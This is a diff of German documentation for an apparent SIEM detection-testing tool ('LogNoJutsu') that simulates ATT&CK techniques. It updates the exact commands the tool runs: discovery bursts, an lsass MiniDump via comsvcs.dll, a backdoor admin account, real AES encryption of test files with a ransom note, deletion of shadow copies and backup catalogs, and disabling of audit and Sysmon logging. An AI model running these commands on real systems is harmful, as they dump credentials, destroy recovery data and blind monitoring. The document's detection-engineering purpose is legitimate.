@@ -338,19 +338,23 @@ Discovery-Techniken laufen in Phase 1 und erzeugen ausschließlich lesende Zugri
 **Was wird ausgeführt:**
 
 ```powershell
-# Hostname, Username, Domain, OS-Version via PowerShell
-$env:COMPUTERNAME; $env:USERNAME; $env:USERDOMAIN
-(Get-CimInstance Win32_OperatingSystem).Caption
-
-# Systeminformationen via Built-in-Tool
-systeminfo | Select-String "OS Name|OS Version|System Type|Domain|Logon Server"
+# Burst von System-Recon-Befehlen in schneller Folge — Exabeam-UEBA-Signal
+systeminfo                        # OS, Domain, RAM, Patches (EID 4688 für systeminfo.exe)
+wmic computersystem get Domain,Manufacturer,Model,UserName  # WMI-Recon (wmic.exe)
+wmic bios get SerialNumber,Manufacturer,SMBIOSBIOSVersion   # Hardware-Fingerprint
+wmic os get Caption,Version,BuildNumber,OSArchitecture      # OS-Details
+reg query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid  # Maschinenidentifikation
+hostname; whoami; whoami /priv    # Benutzerkontext + Privileges
+net config workstation            # Domain, DC, Computername
+ipconfig /all                     # Netzwerkkonfiguration
 ```
 
-**Warum das Angreifer tun:** Systeminformationen sind der erste Schritt nach einer Kompromittierung. Der Angreifer ermittelt Betriebssystemversion (für Exploit-Auswahl), Domain-Zugehörigkeit (für Lateral Movement), und Logon-Server (für DC-Identifikation).
+**Warum das Angreifer tun:** Systeminformationen sind der erste Schritt nach einer Kompromittierung. Die WMIC-Abfragen mit `ComputerSystem`, `BIOS` und `OS` sind besonders charakteristisch — Exabeam wertet den Burst mehrerer Discovery-Tools in kurzer Zeit als UEBA-Anomalie. `MachineGuid` aus der Registry wird für System-Fingerprinting verwendet. `whoami /priv` zeigt vorhandene Privileges für Privilege-Escalation-Planung.
 
 **Erwartete SIEM-Events:**
-- `4688` — `systeminfo.exe` und `powershell.exe` Prozesserstellung
-- `Sysmon 1` — Prozesserstellung mit vollständiger Kommandozeile und Hash
+- `4688` — `systeminfo.exe`, `wmic.exe`, `hostname.exe`, `whoami.exe`, `net.exe` (Burst mehrerer 4688-Events)
+- `Sysmon 1` — Prozesserstellung mit vollständiger Kommandozeile und Hash für jeden Befehl
+- `4104` — ScriptBlock: WMIC- und Registry-Abfragen
 
 ---
 
@@ -367,17 +371,22 @@ systeminfo | Select-String "OS Name|OS Version|System Type|Domain|Logon Server"
 **Was wird ausgeführt:**
 
 ```powershell
-net user                          # Alle lokalen Benutzerkonten
-net localgroup administrators     # Mitglieder der Admin-Gruppe
-net localgroup                    # Alle lokalen Gruppen
-whoami /all                       # Aktueller Benutzer mit Rechten und SID
+net user                           # Alle lokalen Benutzerkonten (EID 4688)
+net user /domain 2>&1              # Domain-Benutzer (EID 4688)
+net localgroup administrators      # Admin-Gruppenmitglieder
+whoami /all                        # Aktueller Benutzer + Privileges + SID
+cmdkey /list                       # Gespeicherte Credentials (Lateral-Movement-Vorbereitung)
+query user 2>&1                    # Aktive Terminal-Sessions
+wmic useraccount get Name,SID,Disabled,PasswordExpires  # WMI Account-Enumeration
+dir C:\Users 2>&1                  # Alle Benutzerprofile (zeigt Accounts ohne net.exe)
 ```
 
-**Warum das Angreifer tun:** Account Discovery ist Voraussetzung für Privilege Escalation und Lateral Movement. Der Angreifer sucht nach privilegierten Konten (Domain Admins, lokale Admins), Dienstkonten und inaktiven Konten zum Missbrauch.
+**Warum das Angreifer tun:** Account Discovery ist Voraussetzung für Privilege Escalation und Lateral Movement. `cmdkey /list` zeigt gespeicherte Credentials für RDP und andere Dienste — ein direkter Schatz für Angreifer. `query user` zeigt aktive Sessions (wer ist gerade eingeloggt). `dir C:\Users` listet Accounts ohne Windows-Befehl. Die Kombination mehrerer Methoden erzeugt ein Burst-Muster im SIEM.
 
 **Erwartete SIEM-Events:**
-- `4688` — `net.exe` mehrfach mit verschiedenen Argumenten
+- `4688` — `net.exe`, `whoami.exe`, `cmdkey.exe`, `wmic.exe`, `query.exe` (Burst mehrerer Events)
 - `Sysmon 1` — Prozesschain mit Kommandozeilen-Argumenten
+- `4104` — ScriptBlock: WMIC-Account-Abfrage
 
 ---
 
@@ -393,9 +402,13 @@ whoami /all                       # Aktueller Benutzer mit Rechten und SID
 **Was wird ausgeführt:**
 
 ```powershell
-netstat -ano                                      # Alle aktiven Verbindungen mit PID
-Get-NetTCPConnection -State Established           # Etablierte Verbindungen
-Get-NetTCPConnection -State Listen                # Lauschende Ports
+netstat -ano                   # Alle Verbindungen mit PID (EID 4688)
+netstat -anob                  # +Process-Name (zeigt welcher Prozess welche Verbindung hält)
+Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch "127\.0\.0\.1|::1|0\.0\.0\.0" }
+                               # Externe Verbindungen — C2-Server-Identifikation
+net use                        # Aktive Netzlaufwerke (Lateral-Movement-Artefakte)
+net session 2>&1               # Eingehende SMB-Sessions (Benutzer der auf diesen Host zugreift)
+wmic path win32_networkconnection get LocalName,RemoteName,Status  # WMI Netzwerk-Verbindungen
 ```
 
 **Warum das Angreifer tun:** Aktive Netzwerkverbindungen zeigen dem Angreifer, welche Server das System kennt (Datenbankserver, Domain Controller, Share-Server) — potenzielle Lateral-Movement-Ziele.
@@ -444,19 +457,31 @@ ipconfig /displaydns    # Lokaler DNS-Cache (zeigt bekannte Hostnamen)
 **Was wird ausgeführt:**
 
 ```powershell
-tasklist /v             # Alle laufenden Prozesse mit Details
+# tasklist-Varianten — /v (Benutzerkontext) und /svc (Services) sind am verdächtigsten
+tasklist                      # Alle Prozesse (EID 4688)
+tasklist /v 2>&1              # Verbose mit Benutzerkontext
+tasklist /svc 2>&1            # Services pro Prozess
+tasklist | findstr /i "lsass csrss winlogon svchost defender mssense splunk cb"  # Gezielte Suche
 
-# Gezielte Suche nach Security-Tools (Attacker Awareness)
-# Sysmon, Splunk, CrowdStrike, Defender, Carbon Black, Cylance,
-# Sentinel, Qualys, Tanium, SentinelOne, Cybereason ...
-Get-Process | Where-Object { $_.Name -match "sysmon|splunk|crowd..." }
+# wmic process get CommandLine — höchstes Signal (EID 4688 wmic.exe, CommandLine-Feld)
+wmic process get Name,ProcessId,ParentProcessId,CommandLine /format:csv
+
+# PowerShell Win32_Process mit CommandLine (EID 4104)
+Get-WmiObject Win32_Process | Select-Object Name, ProcessId, ParentProcessId, CommandLine | Where-Object { $_.CommandLine -ne $null }
+
+# Parent-Child-Tree-Rekonstruktion — Angreifer kartiert Prozesskette
+Get-WmiObject Win32_Process | ForEach-Object {
+    $parent = (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.ParentProcessId)").Name
+    [PSCustomObject]@{ Name=$_.Name; PID=$_.ProcessId; Parent=$parent }
+} | Where-Object { $_.Name -match "lsass|csrss|winlogon|services|svchost" }
 ```
 
-**Warum das Angreifer tun:** Angreifer suchen nach Endpoint-Security-Tools, um diese zu umgehen oder zu deaktivieren. Die Suche nach Sicherheitssoftware-Prozessen ist ein charakteristisches "Attacker Awareness"-Verhalten, das Exabeam als T1057-Aktivität klassifiziert.
+**Warum das Angreifer tun:** Angreifer enumerieren Prozesse, um Security-Tools zu identifizieren (Sysmon, Splunk, CrowdStrike), die sie deaktivieren müssen. `wmic process get CommandLine` ist besonders hochwertig, weil es die vollständige Kommandozeile aller laufenden Prozesse zeigt — ein direktes Erkennungssignal für dieses Argument. Die Parent-Child-Rekonstruktion hilft Angreifern, Injection-Ziele zu identifizieren.
 
 **Erwartete SIEM-Events:**
-- `4688` — `tasklist.exe` mit `/v`
-- `Sysmon 1` — Prozesserstellung
+- `4688` — `tasklist.exe` mit `/v` und `/svc`, `wmic.exe` mit `process get commandline`
+- `Sysmon 1` — Prozesserstellung mit vollständiger Kommandozeile
+- `4104` — ScriptBlock: `Win32_Process CommandLine`-Abfrage
 
 ---
 
@@ -473,20 +498,39 @@ Get-Process | Where-Object { $_.Name -match "sysmon|splunk|crowd..." }
 **Was wird ausgeführt:**
 
 ```powershell
-# Verzeichnisstruktur des User-Profils
-Get-ChildItem -Path $env:USERPROFILE -Depth 1
+# dir /s /b — Angreifer-typisches Verzeichnislisting (EID 4688 für cmd.exe)
+cmd /c "dir /s /b `"$env:USERPROFILE`" 2>nul"
+cmd /c "dir /s /b `"C:\Users`" 2>nul"
 
-# Gezielte Suche nach interessanten Dateitypen
-# *.txt, *.docx, *.xlsx, *.pdf, *.ps1, *.bat, *.config,
-# *.xml, *.json, *.key, *.pem, *.pfx (Zertifikate/Credentials)
-Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue
+# tree /F — Verzeichnisstruktur-Kartierung (EID 4688 für tree.com)
+tree "$env:USERPROFILE" /F 2>&1
+
+# Sensitive Dateisuche — Credential-Hunting-Muster
+Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction Ignore `
+    -Include "*.pdf","*.docx","*.xlsx","*.kdb","*.kdbx","*.pem","*.pfx","*.p12" |
+    Select-Object FullName, Length, LastWriteTime
+
+# Kürzlich modifizierte Dateien — Angreifer prüft aktuelle Aktivität
+Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction Ignore |
+    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
+    Sort-Object LastWriteTime -Descending | Select-Object -First 10
+
+# Alternate Data Stream (ADS) Erkennung — versteckte Daten
+Get-ChildItem -Path $env:TEMP -ErrorAction Ignore | ForEach-Object {
+    $streams = Get-Item $_.FullName -Stream * | Where-Object { $_.Stream -ne ':$DATA' }
+    if ($streams) { Write-Host "ADS found: $($_.FullName)" }
+}
+
+# Credential-Datei-Suche via findstr
+cmd /c "dir /s /b `"$env:USERPROFILE`"" | Where-Object { $_ -match "pass|cred|secret|key|token|\.config$|\.env$" }
 ```
 
-**Warum das Angreifer tun:** Angreifer suchen nach sensitiven Dateien — Konfigurationsdateien mit Passwörtern, SSH-Keys, Zertifikaten, Scripts mit hardcodierten Credentials, und Backup-Dateien. Die Suche nach `.pem`, `.pfx`, `.key` ist ein starkes Indiz für Credential-Hunting.
+**Warum das Angreifer tun:** Angreifer suchen nach KeePass-Datenbanken (`.kdbx`), Zertifikaten (`.pem/.pfx`), kürzlich bearbeiteten Dateien und Credential-Dateien. `dir /s /b` und `tree /F` sind charakteristische Angreifer-Befehle (keine normalen Benutzer verwenden diese). ADS-Erkennung zeigt, ob versteckte Daten vorhanden sind.
 
 **Erwartete SIEM-Events:**
-- `4688` — `powershell.exe` mit `Get-ChildItem`
-- `Sysmon 1` — Prozesserstellung
+- `4688` — `cmd.exe` mit `dir /s /b`, `tree.com`-Prozess
+- `Sysmon 1` — `tree.com` und `cmd.exe` Prozesserstellung
+- `4104` — ScriptBlock: `Get-ChildItem` mit sensitiven Include-Filtern und ADS-Erkennung
 
 ---
 
@@ -502,19 +546,39 @@ Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue
 **Was wird ausgeführt:**
 
 ```powershell
-net localgroup                        # Alle lokalen Gruppen
-net localgroup "Administrators"       # Mitglieder der Admin-Gruppe
-net localgroup "Remote Desktop Users" # RDP-berechtigte Benutzer
+# net localgroup Administrators — höchstes Signal in SIEM-Regeln (standalone Tier-1-Alert)
+net localgroup                          # Alle Gruppen
+net localgroup Administrators           # Admin-Mitglieder (standalone Tier-1 SIEM-Alert)
+net localgroup "Remote Desktop Users"   # RDP-Berechtigung
+net localgroup "Remote Management Users" # WinRM-Berechtigung
+net localgroup "Backup Operators"       # Backup-Privilege (kann SAM dumpen)
 
-# Domain-Abfrage (nur wenn System domain-joined):
-net group /domain
+# whoami /groups — aktuelle Gruppenmitgliedschaft
+whoami /groups /fo csv
+
+# PowerShell Get-LocalGroup / Get-LocalGroupMember (EID 4104)
+Get-LocalGroup | Select-Object Name, Description, SID
+Get-LocalGroupMember -Group "Administrators"
+
+# wmic Gruppen-Enumeration (EID 4688 für wmic.exe)
+wmic group get Name,SID,Domain,LocalAccount /format:csv
+
+# .NET WindowsIdentity — Angreifer prüft eigene Privileges
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object {
+    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
+} | Where-Object { $_ -match "Admin|Power|Remote|Backup" }
+
+# Domain-Gruppen (wenn domain-joined)
+net group /domain 2>&1
+net group "Domain Admins" /domain 2>&1
 ```
 
-**Warum das Angreifer tun:** Gruppenabfragen zeigen, welche Accounts privilegierten Zugriff haben. "Remote Desktop Users" ist ein häufiges Ziel für Lateral Movement via RDP. Domain-Gruppen wie "Domain Admins" oder "Enterprise Admins" sind die ultimativen Ziele.
+**Warum das Angreifer tun:** `net localgroup Administrators` ist einer der am stärksten signierten Befehle in SIEM-Regelwerken — viele Lösungen haben ihn als standalone Tier-1-Alert. "Remote Management Users" zeigt WinRM-Zugangsmöglichkeiten für PowerShell-Remoting. "Backup Operators" hat das Recht, die SAM-Datenbank zu lesen — ein Escalation-Pfad.
 
 **Erwartete SIEM-Events:**
-- `4688` — `net.exe` mehrfach mit Gruppenargumenten
-- Bei Domain-Abfrage: `4661` (LDAP-Suche)
+- `4688` — `net.exe` mit `localgroup Administrators` — **standalone Tier-1 SIEM-Alert**
+- `4688` — `whoami.exe` mit `/groups`, `wmic.exe`
+- `4104` — ScriptBlock: `Get-LocalGroup`, `.NET WindowsIdentity`-Abfragen
 
 ---
 
@@ -530,19 +594,31 @@ net group /domain
 **Was wird ausgeführt:**
 
 ```powershell
-# Scan der wichtigsten Angreifer-Ports auf localhost und Gateway
-$ports = @(21, 22, 23, 25, 53, 80, 135, 139, 443, 445,
-           1433, 3306, 3389, 5985, 8080)
-foreach ($port in $ports) {
-    Test-NetConnection -ComputerName "127.0.0.1" -Port $port
+# Paralleler Port-Scan via RunspaceFactory — erzeugt Burst-Signatur (wie echte Scanner)
+# 10 Runspaces gleichzeitig — sequentielle Scans erzeugen kein erkennbares Scanner-Pattern
+$ports = @(21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5985, 5986, 8080, 8443, 9389)
+$pool = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspacePool(1, 10)
+$pool.Open()
+$jobs = foreach ($port in $ports) {
+    $ps = [PowerShell]::Create()
+    $ps.RunspacePool = $pool
+    $ps.AddScript({
+        param($target, $port)
+        $tcp = New-Object System.Net.Sockets.TcpClient
+        try { $tcp.Connect($target, $port); $tcp.Close(); "OPEN:$port" } catch { "CLOSED:$port" }
+    }).AddArgument("127.0.0.1").AddArgument($port) | Out-Null
+    @{ PS=$ps; Handle=$ps.BeginInvoke() }
 }
+$jobs | ForEach-Object { $_.PS.EndInvoke($_.Handle); $_.PS.Dispose() }
+$pool.Close()
 ```
 
-**Warum das Angreifer tun:** Port-Scanning nach der initialen Kompromittierung dient der Identifikation laufender Services für weitere Angriffsvektoren. Port 3389 (RDP), 445 (SMB), 1433 (SQL Server) und 5985 (WinRM) sind Hauptziele für Lateral Movement.
+**Warum das Angreifer tun:** Port-Scanning dient der Service-Identifikation für Lateral Movement. Der entscheidende Unterschied: Sequentielle Scans erzeugen kein erkennbares Muster in SIEM-Regelwerken. **Parallele** Verbindungsversuche erzeugen einen Burst von Sysmon-EID-3-Events in sehr kurzer Zeit — genau das Muster, das Nmap und andere Scanner erzeugen und auf das SIEM-Korrelationsregeln prüfen.
 
 **Erwartete SIEM-Events:**
-- `Sysmon 3` — NetworkConnect-Events für jede Verbindungsattempt
+- `Sysmon 3` — NetworkConnect-Burst: 18 Events in ~1-2 Sekunden (Burst-Signatur = Scanner-Pattern)
 - `4688` — `powershell.exe` Prozesserstellung
+- `4104` — ScriptBlock: RunspaceFactory-Parallel-Scan
 
 ---
 
@@ -852,20 +928,30 @@ foreach ($account in $accounts | Select-Object -First 5) {
 **Was wird ausgeführt:**
 
 ```powershell
-# Windows-API: Handle auf lsass.exe mit PROCESS_QUERY_INFORMATION (0x0400)
-# Das ist exakt der erste Schritt, den Mimikatz ausführt
-Add-Type -MemberDefinition $sig -Name WinAPI -Namespace LogNoJutsu
-$handle = [LogNoJutsu.WinAPI]::OpenProcess(0x0400, $false, $lsassPID)
+# Method 1: comsvcs.dll MiniDump via rundll32 — LOLBin approach (Sysmon EID 1+10+11)
+# Generiert exakt die Events, die ProcDump und Cobalt Strike erzeugen
+$lsassPID = (Get-Process lsass).Id
+$dumpPath = "$env:TEMP\lsass_sim.dmp"
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $dumpPath full
 
-# Handle sofort schließen — KEINE Credential-Extraktion
-[LogNoJutsu.WinAPI]::CloseHandle($handle)
+# Method 2: Windows-API OpenProcess mit GrantedAccess=0x1010
+# 0x1010 = PROCESS_VM_READ (0x0010) | PROCESS_QUERY_INFORMATION (0x0400) — exakter Mimikatz/SafetyKatz-Wert
+# Das ist das Flag, auf das Sysmon EID 10 und SIEM-Regeln prüfen (0x0400 allein triggert deutlich weniger Regeln)
+$handle = [LNJ01.LNJWin]::OpenProcess(0x1010, $false, $lsassPID)
+[LNJ01.LNJWin]::CloseHandle($handle)  # KEINE Credential-Extraktion
+
+# Method 3: ProcDump-ähnlicher Zugriff mit 0x1fffff (PROCESS_ALL_ACCESS)
+$handle2 = [LNJ01.LNJWin]::OpenProcess(0x1fffff, $false, $lsassPID)
+[LNJ01.LNJWin]::CloseHandle($handle2)
 ```
 
-**Warum das Angreifer tun:** LSASS (Local Security Authority Subsystem Service) speichert Passwort-Hashes und Kerberos-Tickets im Speicher. Tools wie Mimikatz, Procdump und Task Manager können den LSASS-Prozess dumpen. Der Handle-Zugriff auf `lsass.exe` ist der primäre Sysmon-10-Trigger — dasselbe Signal, das Mimikatz auslöst.
+**Warum das Angreifer tun:** LSASS (Local Security Authority Subsystem Service) speichert Passwort-Hashes und Kerberos-Tickets im Speicher. Tools wie Mimikatz, Procdump und Task Manager können den LSASS-Prozess dumpen. Der kritische Unterschied: `GrantedAccess=0x1010` ist der exakte Zugriffsmaskenwert von Mimikatz — SIEM-Regeln prüfen auf diesen spezifischen Wert im Sysmon-10-Event. Das LOLBin-Verfahren über `comsvcs.dll MiniDump` generiert zusätzlich Sysmon EID 11 (FileCreate) für die Dump-Datei.
 
 **Erwartete SIEM-Events:**
-- `Sysmon 10` — ProcessAccess: `TargetImage = lsass.exe` — **primäres Credential-Dumping-Signal**
-- `4656` — Handle-Anfrage auf `lsass.exe` (bei aktivierter Objekt-Auditierung)
+- `Sysmon 10` — ProcessAccess: `TargetImage = lsass.exe`, `GrantedAccess = 0x1010` — **primäres Credential-Dumping-Signal**
+- `Sysmon 1` — `rundll32.exe` mit `comsvcs.dll, MiniDump`-Argument (LOLBin-Erkennung)
+- `Sysmon 11` — FileCreate: `.dmp`-Datei in `%TEMP%` (Dump-Datei-Erkennung)
+- `4688` — `rundll32.exe` Prozesserstellung mit comsvcs.dll
 
 ---
 
@@ -1064,25 +1150,39 @@ net user lnj_test_acct /delete
 **Was wird ausgeführt:**
 
 ```powershell
-# Test-Account anlegen (wenn nicht vorhanden)
-net user lnj_test_acct "LogNoJutsu!Temp2024" /add
+# Step 1: Account anlegen (EID 4720)
+net user LNJManipUser "P@ssw0rd123!" /add /comment:"Windows Service Account" /fullname:"Windows Update Agent"
 
-# Zu lokalen Administrators hinzufügen (generiert Event 4732)
-net localgroup Administrators lnj_test_acct /add
+# Step 2: Zu Administrators hinzufügen (EID 4732 — Exabeam Account-Manipulation-Trigger)
+net localgroup Administrators LNJManipUser /add
+
+# Step 3: Account-Eigenschaften modifizieren (EID 4738 — PasswordNeverExpires)
+Set-LocalUser -Name "LNJManipUser" -PasswordNeverExpires $true -UserMayNotChangePassword $true
+
+# Step 4: Passwort ändern via net user (EID 4723)
+net user LNJManipUser "NewP@ssw0rd456!"
+
+# Step 5: Account deaktivieren + re-aktivieren (EID 4725 + 4722)
+net user LNJManipUser /active:no
+net user LNJManipUser /active:yes
 ```
 
 **Cleanup:**
 
 ```powershell
-net localgroup Administrators lnj_test_acct /delete
-net user lnj_test_acct /delete
+net localgroup Administrators LNJManipUser /delete
+net user LNJManipUser /delete
 ```
 
-**Warum das Angreifer tun:** Ein bereits kompromittiertes Nicht-Admin-Konto wird in die Administrators-Gruppe aufgenommen, um persistente Adminrechte zu sichern. Mit 57 dedizierten Exabeam-Regeln ist T1098 einer der best-detektierten Techniken — ein erfolgreicher Test zeigt, dass die Gruppenänderungs-Auditierung korrekt funktioniert.
+**Warum das Angreifer tun:** Die vollständige Account-Manipulation-Kette (Anlegen + Eskalation + Attribute-Änderung + Passwort) ist die authentische APT-Backdoor-Sequenz. Exabeam hat 57 Regeln für T1098, weil jeder Schritt ein eigenes Event erzeugt. `PasswordNeverExpires=True` (EID 4738) ist ein starkes Signal, dass ein Account für langfristige Persistenz vorbereitet wird.
 
 **Erwartete SIEM-Events:**
-- `4732` — Member added to security-enabled local group — **Kern-Event**
-- `4728` — Member added to global security group (Domain-Kontext)
+- `4720` — User account created
+- `4732` — Member added to Administrators — **primäres Account-Manipulation-Signal**
+- `4738` — User account changed (PasswordNeverExpires, UserMayNotChangePassword)
+- `4723` — Password change attempted
+- `4725` — Account disabled + `4722` — Account re-enabled
+- `4688` — `net.exe` mit Benutzer-Management-Argumenten
 
 ---
 
@@ -1435,42 +1535,50 @@ Remove-Item "$env:TEMP\LogNoJutsu_Masq" -Recurse -Force
 **Was wird angelegt:**
 
 ```
-%TEMP%\LogNoJutsu_RansomSim\
-  ├── document.docx.lnj_encrypted
-  ├── spreadsheet.xlsx.lnj_encrypted
-  ├── presentation.pptx.lnj_encrypted
-  ├── ...  (10 Dateien)
-  └── README_RESTORE_FILES.txt
+%TEMP%\LNJ_T1486\
+  ├── document_1.txt.locked  (AES-256 verschlüsselt)
+  ├── document_2.txt.locked
+  ├── ...  (18 Dateien, .txt / .docx / .xml)
+  └── README_DECRYPT.txt     (Ransom-Note)
 ```
 
 **Was wird ausgeführt:**
 
 ```powershell
-# Testdateien erstellen (Sysmon 11 — Mass FileCreate)
-foreach ($name in $fileNames) {
-    Set-Content -Path "$targetDir\$name" -Value "Test file content"
+# Testdateien erstellen (Sysmon EID 11 — Mass FileCreate)
+1..10 | ForEach-Object { "Document content $_" | Out-File "$testDir\document_$_.txt" }
+1..5  | ForEach-Object { "Spreadsheet data $_" | Out-File "$testDir\report_$_.docx"  }
+1..3  | ForEach-Object { "Config data $_"      | Out-File "$testDir\config_$_.xml"   }
+
+# AES-256 via .NET RNGCryptoServiceProvider — exaktes Ransomware-Muster (keine externen Tools)
+$key = New-Object byte[] 32
+(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($key)
+Get-ChildItem -Path $testDir -File | ForEach-Object {
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $key
+    $inBytes  = [System.IO.File]::ReadAllBytes($_.FullName)
+    $outBytes = $aes.CreateEncryptor().TransformFinalBlock($inBytes, 0, $inBytes.Length)
+    [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $outBytes)
+    Remove-Item $_.FullName   # Original-Datei löschen — Sysmon EID 23 (FileDelete)
 }
 
-# Dateien mit fake-verschlüsselter Erweiterung umbenennen
-Get-ChildItem $targetDir | ForEach-Object {
-    Rename-Item $_.FullName -NewName ($_.Name + ".lnj_encrypted")
-}
-
-# Ransom-Note erstellen (Sysmon 11 — README_RESTORE_FILES.txt)
-Set-Content -Path "$targetDir\README_RESTORE_FILES.txt" -Value $note
+# Ransom-Note erstellen (Sysmon EID 11)
+"YOUR FILES HAVE BEEN ENCRYPTED BY LOGNOJUTSU SIMULATION..." | Out-File "$testDir\README_DECRYPT.txt"
 ```
 
 **Cleanup:**
 
 ```powershell
-Remove-Item "$env:TEMP\LogNoJutsu_RansomSim" -Recurse -Force
+Remove-Item "$env:TEMP\LNJ_T1486" -Recurse -Force
 ```
 
-**Warum das Angreifer tun:** Ransomware benennt verschlüsselte Dateien mit einer neuen Erweiterung um und erstellt eine Ransom-Note. Das Muster aus massenhafter Datei-Umbenennung + unbekannte Erweiterung + README-Datei-Erstellung ist das primäre Verhaltenssignal für Ransomware-Erkennung in SIEM/EDR. **Keine echte Verschlüsselung findet statt.**
+**Warum das Angreifer tun:** Ransomware erzeugt einen charakteristischen "File-Churn"-Burst: Massen-FileCreate (neue `.locked`-Dateien) + Massen-FileDelete (Original-Dateien) in kurzer Zeit, gefolgt von einer Ransom-Note-Erstellung. Dieses Muster wird von behavioralen EDR-Lösungen und Exabeam (EID Sysmon 11/23) erkannt. Die echte AES-256-Verschlüsselung via `.NET` erzeugt dieselben ScriptBlock-Log-Einträge (EID 4104) wie reale Malware — nur innerhalb des sicheren `%TEMP%`-Testverzeichnisses.
 
 **Erwartete SIEM-Events:**
-- `Sysmon 11` — Massen-FileCreate und Datei-Rename mit unbekannter Extension
-- `4688` — `powershell.exe` Prozesserstellung
+- `Sysmon 11` — FileCreate-Burst: 18 `.locked`-Dateien + Ransom-Note
+- `Sysmon 23` — FileDelete-Burst: 18 Original-Dateien gelöscht
+- `4104` — ScriptBlock: `RNGCryptoServiceProvider`, `CreateEncryptor`, `TransformFinalBlock`
+- `Windows Defender EID 1116/1117` — Behavioral Ransomware Detection (kann triggern)
 
 ---
 
@@ -1482,28 +1590,40 @@ Remove-Item "$env:TEMP\LogNoJutsu_RansomSim" -Recurse -Force
 | Taktik | Impact |
 | Exabeam-Regeln | 6 |
 | Admin erforderlich | **Ja** |
-| Cleanup | Keiner — Shadow Copies werden **nicht** gelöscht |
+| Cleanup | **Ja** — Boot-Recovery wiederhergestellt, SystemRestore-Keys entfernt |
 
 **Was wird ausgeführt:**
 
-```cmd
-# Shadow Copies AUFLISTEN (nicht löschen)
-vssadmin list shadows
-wmic shadowcopy list brief
+```powershell
+# Step 1: Boot-Recovery deaktivieren (EID 4688 für bcdedit.exe)
+bcdedit.exe /set "{default}" bootstatuspolicy ignoreallfailures
+bcdedit.exe /set "{default}" recoveryenabled no
+
+# Step 2: vssadmin delete shadows — #1 Ransomware-Indikator (standalone Tier-1 SIEM-Alert)
+vssadmin.exe delete shadows /all /quiet
+
+# Step 3: WMI Shadow Copy Delete (redundante Methode, die echte Ransomware nutzt)
+wmic.exe shadowcopy delete
+
+# Step 4: Backup Catalog löschen
+wbadmin.exe delete catalog -quiet
+
+# Step 5: System Restore Registry-Disable (Sysmon EID 13)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
 ```
 
-Das Tool zeigt informatorisch, welche Befehle ein Angreifer ausführen würde:
-```
-vssadmin delete shadows /all /quiet       ← WIRD NICHT AUSGEFÜHRT
-wmic shadowcopy delete                    ← WIRD NICHT AUSGEFÜHRT
-bcdedit /set {default} recoveryenabled no ← WIRD NICHT AUSGEFÜHRT
-```
+**Cleanup:** `bcdedit /set recoveryenabled yes` + Registry-Keys entfernt
 
-**Warum das Angreifer tun:** Das Löschen von Volume Shadow Copies (VSS) und Deaktivierung der Windows-Wiederherstellung verhindert, dass Opfer ihre Daten wiederherstellen können — klassischer Ransomware-Vorläufer. `vssadmin.exe` und `wmic.exe` mit Shadow-Copy-Argumenten sind in Exabeam als "Disable Windows recovery mode" Correlation Rule mit Severity 2 hinterlegt.
+**Warum das Angreifer tun:** Das Löschen von Volume Shadow Copies und Deaktivierung der Windows-Wiederherstellung verhindert, dass Opfer ihre Daten ohne Lösegeld wiederherstellen können — die klassische Ransomware-Pre-Encryption-Sequenz (Ryuk, LockBit, BlackMatter). `vssadmin delete shadows /all /quiet` ist ein standalone Tier-1 SIEM-Alert in Exabeam als "Disable Windows recovery mode" Correlation Rule.
 
 **Erwartete SIEM-Events:**
-- `4688` — `vssadmin.exe` und `wmic.exe` mit Shadow-Copy-Argumenten
-- `Sysmon 1` — Prozesserstellung mit vollständigen Argumenten
+- `4688` — `bcdedit.exe /set recoveryenabled no` — **Boot-Recovery-Deaktivierung**
+- `4688` — `vssadmin.exe delete shadows /all /quiet` — **Standalone Tier-1 SIEM-Alert**
+- `4688` — `wmic.exe shadowcopy delete`
+- `4688` — `wbadmin.exe delete catalog`
+- `Sysmon 13` — RegistryValueSet: SystemRestore-Disable-Keys
+- `System EID 7036` — Volume Shadow Copy Service state change
 
 ---
 
@@ -1519,24 +1639,28 @@ bcdedit /set {default} recoveryenabled no ← WIRD NICHT AUSGEFÜHRT
 
 **Was wird ausgeführt:**
 
-```cmd
-# Aktuelle Logon-Audit-Policy abfragen
-auditpol /get /subcategory:"Logon" /r
-
-# Logon-Auditierung temporär deaktivieren (wird sofort in Cleanup wiederhergestellt)
+```powershell
+# Step 1: auditpol backup + kategoriewise deaktivieren (EID 4719 pro Änderung)
+auditpol /backup /file:"$env:TEMP\lnj_auditpol_backup.csv"
 auditpol /set /subcategory:"Logon" /success:disable /failure:disable
+auditpol /set /subcategory:"Process Creation" /success:disable
+
+# Step 2: wevtutil Kanal-Deaktivierung (Sysmon und PS-Log)
+wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false
+wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false
+
+# Step 3: Registry MaxSize auf 1 MB reduzieren (silencer für Log-Rotation)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v MaxSize /t REG_DWORD /d 0x100000 /f
 ```
 
-**Cleanup:**
+**Cleanup:** `auditpol /restore /file:backup.csv` + wevtutil re-enable + Registry-Wert entfernt
 
-```cmd
-auditpol /set /subcategory:"Logon" /success:enable /failure:enable
-```
-
